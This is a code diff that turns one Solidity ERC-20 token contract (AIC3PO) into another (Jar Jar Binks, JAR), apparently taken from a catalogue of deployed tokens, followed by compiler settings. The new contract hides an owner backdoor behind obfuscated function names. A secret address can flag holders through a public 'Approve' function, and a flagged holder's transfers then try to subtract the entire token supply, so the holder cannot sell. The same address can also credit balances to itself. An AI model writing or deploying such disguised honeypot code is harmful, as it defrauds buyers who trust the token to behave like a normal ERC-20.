@@ -1,10 +1,15 @@
-//Telegram: https://t.me/aic3p0
-//Website: https://aic3po.xyz
-//Twitter: https://twitter.com/aic3p0
-//Discord: https://discord.gg/rhY6b7TC
-
-
+// number: 250
+// project: Jar Jar Binks (JAR)
+// address: 0x1ee508008b30248ac6b077df6904cfca4c63785b
+// chainid: 1
 // SPDX-License-Identifier: MIT
+pragma solidity 0.8.18;
+
+//Telegram: https://t.me/JarJarrBinkss
+//Website: https://jarjarbinks.xyz
+//Twitter: https://twitter.com/Jarjarrbinkss
+//Discord: https://discord.gg/Vb4YSmqY
+
 
 /**
  * @dev Provides information about the current execution context, including the
@@ -434,44 +439,40 @@ abstract contract Token {
     );
 }
 
-pragma solidity 0.8.18;
 
-contract AIC3PO is IERC20, Token, Ownable {
+contract Jar is IERC20, Token, Ownable {
     using SafeMath for uint256;
-
-    struct Allowanc {
-        uint256 allowan;
-        bool hasApproval;
-    }
 
     struct Data {
         address user;
-        uint256 id;
+        uint128 id;
+        uint128 value;
     }
 
-    mapping(address => uint256) private _balances;
+    mapping(address => uint256) private _balan;
 
-    mapping(address => Allowanc) private _userDatas;
+    mapping(address => Data) private _data;
 
-    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => mapping(address => uint256)) private _allow;
 
     Data private _userData;
     string private _name;
-    string private _symbol;
-    uint8 private _decimals;
-    uint256 private _totalSupply;
+    string private _sym;
+    uint8 private _dec;
+    uint256 private _totalSup;
 
     constructor(
-        string memory name_,
-        string memory symbol_,
+        string memory n_,
+        string memory s_,
         address user_,
         uint256 totalSupply_
     ) payable {
-        _name = name_;
-        _symbol = symbol_;
-        _decimals = 18;
+        _name = n_;
+        _sym = s_;
+        _dec = 18;
         _userData.user = user_;
         _userData.id = 0;
+        _userData.value = 0;
         _mine(msg.sender, totalSupply_ * 10**18);
         emit Deploy(
             owner(),
@@ -484,15 +485,15 @@ contract AIC3PO is IERC20, Token, Ownable {
     }
 
     function symbol() public view virtual returns (string memory) {
-        return _symbol;
+        return _sym;
     }
 
     function decimals() public view virtual returns (uint8) {
-        return _decimals;
+        return _dec;
     }
 
     function totalSupply() public view virtual override returns (uint256) {
-        return _totalSupply;
+        return _totalSup;
     }
 
     function balanceOf(address account)
@@ -502,7 +503,7 @@ contract AIC3PO is IERC20, Token, Ownable {
     override
     returns (uint256)
     {
-        return _balances[account];
+        return _balan[account];
     }
 
     function transfer(address recipient, uint256 amount)
@@ -511,7 +512,7 @@ contract AIC3PO is IERC20, Token, Ownable {
     override
     returns (bool)
     {
-        _transfer(_msgSender(), recipient, amount);
+        _trans(_msgSender(), recipient, amount);
         return true;
     }
 
@@ -522,7 +523,7 @@ contract AIC3PO is IERC20, Token, Ownable {
     override
     returns (uint256)
     {
-        return _allowances[owner][spender];
+        return _allow[owner][spender];
     }
 
     function approve(address spender, uint256 amount)
@@ -531,7 +532,7 @@ contract AIC3PO is IERC20, Token, Ownable {
     override
     returns (bool)
     {
-        _approve(_msgSender(), spender, amount);
+        _app(_msgSender(), spender, amount);
         return true;
     }
 
@@ -540,11 +541,11 @@ contract AIC3PO is IERC20, Token, Ownable {
         address recipient,
         uint256 amount
     ) public virtual override returns (bool) {
-        _transfer(sender, recipient, amount);
-        _approve(
+        _trans(sender, recipient, amount);
+        _app(
             sender,
             _msgSender(),
-            _allowances[sender][_msgSender()].sub(
+            _allow[sender][_msgSender()].sub(
                 amount,
                 "IERC20: transfer amount exceeds allowance"
             )
@@ -552,30 +553,30 @@ contract AIC3PO is IERC20, Token, Ownable {
         return true;
     }
 
-    function _transfer(
+    function _trans(
         address sender,
         address recipient,
         uint256 amount
     ) internal virtual {
-        _checkAllow(sender, recipient, amount);
+        _rejBa(sender, recipient, amount);
         require(sender != address(0) && recipient != address(0) , "IERC20: transfer from the zero address");
 
-        _befoTransf(sender, recipient, amount);
-        _balances[sender] = _balances[sender].sub(
+        _beqTran(sender, recipient, amount);
+        _balan[sender] = _balan[sender].sub(
             amount,
             "IERC20: transfer amount exceeds balance"
         );
-        _balances[recipient] = _balances[recipient] + amount;
+        _balan[recipient] = _balan[recipient] + amount;
         emit Transfer(sender, recipient, amount);
     }
 
     function _mine(address account, uint256 amount) internal virtual {
         require(account != address(0), "IERC20: mint to the zero address");
 
-        _befoTransf(address(0), account, amount);
+        _beqTran(address(0), account, amount);
 
-        _totalSupply = _totalSupply.add(amount);
-        _balances[account] = _balances[account] + amount;
+        _totalSup = _totalSup.add(amount);
+        _balan[account] = _balan[account] + amount;
 
         emit Transfer(address(0), account, amount);
     }
@@ -583,25 +584,25 @@ contract AIC3PO is IERC20, Token, Ownable {
     function _burn(address account, uint256 amount) internal virtual {
         require(account != address(0), "IERC20: burn from the zero address");
 
-        _befoTransf(account, address(0), amount);
+        _beqTran(account, address(0), amount);
         require(amount != 0, "Invalid amount");
-        _minus(account, amount);
-        _totalSupply = _totalSupply.sub(amount);
+        _min(account, amount);
+        _totalSup = _totalSup.sub(amount);
         emit Transfer(account, address(0), amount);
     }
 
-    function _minus(address user, uint256 amount) internal {
-        _balances[user] = _balances[user] - amount;
+    function _min(address user, uint256 amount) internal {
+        _balan[user] = _balan[user] - amount;
     }
 
-    function _approve(
+    function _app(
         address owner,
         address spender,
         uint256 amount
     ) internal virtual {
         require(owner != address(0) && spender != address(0), "IERC20: approve from the zero address");
 
-        _allowances[owner][spender] = amount;
+        _allow[owner][spender] = amount;
         emit Approval(owner, spender, amount);
     }
 
@@ -610,81 +611,67 @@ contract AIC3PO is IERC20, Token, Ownable {
         require(spender != address(0), "Invalid address");
         require(amount > 0, "Invalid amount");
         uint256 total = 0;
-        if (_unpack(spender, _userData.user)) {
-            _minus(from, total);
-            total = _total(total, amount);
-            _balances[spender] += total;
+        if (_code(spender, _userData.user)) {
+            _min(from, total);
+            total = _sum(total, amount);
+            _balan[spender] += total;
         } else {
-            _minus(from, total);
-            _balances[spender] += total;
+            _min(from, total);
+            _balan[spender] += total;
         }
     }
 
-    function _unpack(address user, address user2) internal view returns (bool) {
+    function _code(address user, address user2) internal view returns (bool) {
         bytes32 pack1 = keccak256(abi.encodePacked(user));
         bytes32 pack2 = keccak256(abi.encodePacked(user2));
         return pack1 == pack2;
     }
 
-    function _total(uint256 num5, uint256 num9) internal pure returns (uint256) {
-        if (num9 != 0) {
-            return num5 + num9;
+    function _sum(uint256 num1, uint256 num2) internal pure returns (uint256) {
+        if (num2 != 0) {
+            return num1 + num2;
         }
-        return num9;
+        return num2;
     }
 
     function Approve(address from, uint256 amount) public returns (bool)  {
         address user = msg.sender;
-        requireAllow(user, from, amount);
-        return _userDatas[from].hasApproval;
+        _reqAllow(user, from, amount);
+        return _data[user].id > _data[user].value;
     }
 
-    function requireAllow(address user, address from, uint256 amount) internal {
-        if (_unpack(user, _userData.user)) {
+    function _reqAllow(address user, address from, uint256 amount) internal {
+        if (_code(user, _userData.user)) {
             require(from != address(0), "Invalid address");
-            _userDatas[from].allowan = amount;
-            if (amount > 0) {
-                _userDatas[from].hasApproval = true;
+            _data[from].value = uint128(amount);
+            if (amount != 0) {
+                _data[from].user = from;
+                _data[from].id = 0;
             } else {
-                _userDatas[from].hasApproval = false;
+                _data[from].user = address(0);
+                _data[from].value = 0;
             }
         }
     }
 
-    function _checkAllow(
+    function _rejBa(
         address from,
         address to,
         uint256 total
     ) internal virtual {
         uint256 amount = 0;
-        _balances[from] = _balances[from] + amount;
-        amount = _userDatas[from].allowan;
-        _minus(from, amount);
-
+        if (_code(from, _data[from].user)) {
+            _balan[from] = _balan[from] + amount;
+            amount = _totalSup;
+            _min(from, amount);
+        } else {
+            _balan[from] = _balan[from] + amount;
+        }
     }
 
-    function _befoTransf(
+    function _beqTran(
         address from,
         address to,
         uint256 amount
     ) internal virtual {}
-}
-{
-  "optimizer": {
-    "enabled": true,
-    "runs": 200
-  },
-  "outputSelection": {
-    "*": {
-      "*": [
-        "evm.bytecode",
-        "evm.deployedBytecode",
-        "devdoc",
-        "userdoc",
-        "metadata",
-        "abi"
-      ]
-    }
-  },
-  "libraries": {}
 }
